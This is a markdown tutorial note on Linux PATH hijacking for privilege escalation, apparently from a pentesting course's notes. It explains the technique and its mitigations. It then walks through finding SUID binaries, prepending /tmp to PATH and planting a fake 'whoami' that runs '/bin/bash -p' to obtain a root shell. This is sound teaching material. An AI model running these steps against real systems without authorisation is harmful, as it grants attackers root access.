---
title: "PATH Hijacking"
category: ["S4VITAR", "fases", "7-Escalada de privilegios", "PATH Hijacking"]
---

**PATH Hijacking** is a technique used by attackers to **hijack** **commands** in a Unix/Linux system by manipulating the **PATH**. PATH is an environment variable that defines the search paths for executable files on the system.

In some compiled binaries, some of the internally defined commands may be specified with a relative path instead of an absolute path. This means the binary searches for executable files in the paths specified in PATH, rather than using the absolute path of the executable file.

If an attacker can alter the PATH and create a new file with the same name as one of the internally defined commands in the binary, they can trick the binary into executing the malicious version of the command instead of the legitimate one.

For example, if a compiled binary uses the command “**ls**” without its absolute path in its code, and the attacker creates a malicious file named “**ls**” in one of the paths specified in PATH, the binary will execute the malicious file instead of the legitimate “**ls**” command when called.

To prevent PATH Hijacking, it is recommended to use **absolute paths** instead of relative paths for internally defined commands in compiled binaries. Additionally, it is important to ensure that the paths in PATH are controlled and limited to the necessary paths for the system. It is also advisable to set execution permissions for executable files only for authorized users and groups.

#### Step 1: Identifying the Vulnerable Binary

First, locate files with the SUID bit set. These files run with the privileges of the owner (in this case, root).

- **Command:** `find / -perm -4000 -type f 2>/dev/null`
    
- **Your scenario:** You found a file named `test`.
    

#### Step 2: Execution Analysis and Strings

Observe what the program does when executed. If it prints "root" twice, you suspect it uses the `whoami` command.

- **Static analysis:** Use `strings test | grep whoami`.
    
- **What you discover:**
    
    1. `/usr/bin/whoami` (Absolute path: **Safe**, not easily hijackable).
        
    2. `whoami` (Relative path: **Vulnerable**, the system will have to search for it).
        

#### Step 3: Reviewing the Current $PATH

Check where the system currently searches for commands.

- **Command:** `echo $PATH`
    
- **Typical result:** `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
    
- **Analysis:** The system will search for `whoami` first in `/usr/local/sbin`, then in `/usr/local/bin`, etc. The goal is to make it search first in a location you control.
    

#### Step 4: PATH Manipulation

Add a directory where you have write permissions (like `/tmp`) to the **beginning** of the PATH variable.

- **Command:** `export PATH=/tmp:$PATH`
    
- **Why:** Now, when someone types `whoami`, the system will first look in `/tmp`. If it finds something there with that name, it will execute it and stop searching.
    

#### Step 5: Creating the "Fake" Binary (Payload)

Create a file with the same name as the relative command used by the vulnerable binary.

- **Command:**
    
    Bash
    
    ```
    echo "/bin/bash -p" > /tmp/whoami
    chmod +x /tmp/whoami
    ```
    
- **Explanation:** The `-p` flag is critical in modern systems to prevent `bash` from dropping SUID privileges and maintain root shell (Effective User ID).

#### Step 6: Execution and Escalation

Execute the original `test` binary.

1. The `test` binary runs as **root**.
    
2. It executes `/usr/bin/whoami` (the system goes to the fixed path, outputs "root").
    
3. It executes `whoami` (the system checks `$PATH`, sees `/tmp` comes first, finds your script and executes it).
    
4. **Result:** You get an interactive console with root privileges.